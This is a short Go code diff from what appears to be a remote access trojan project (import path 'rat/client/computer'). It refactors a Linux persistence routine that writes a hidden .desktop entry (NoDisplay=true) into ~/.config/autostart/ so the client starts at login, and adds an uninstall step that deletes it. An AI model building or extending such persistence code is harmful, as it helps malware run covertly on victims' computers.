@@ -8,7 +8,7 @@ import (
 	"rat/client/computer"
 )
 
-func Install(name, path string) error {
+func getDirectory() string {
 	home := computer.GetComputerInformation().HomeDir
 
 	dir := home + "/.config/autostart/"
@@ -17,7 +17,11 @@ func Install(name, path string) error {
 		os.Mkdir(dir, 0777)
 	}
 
-	file, err := os.Create(dir + name + ".desktop")
+	return dir
+}
+
+func Install(name, path string) error {
+	file, err := os.Create(getDirectory() + name + ".desktop")
 	if err != nil {
 		return err
 	}
@@ -36,5 +40,5 @@ NoDisplay=true`)
 }
 
 func Uninstall(name string) {
-
+	os.Remove(getDirectory() + name + ".desktop")
 }
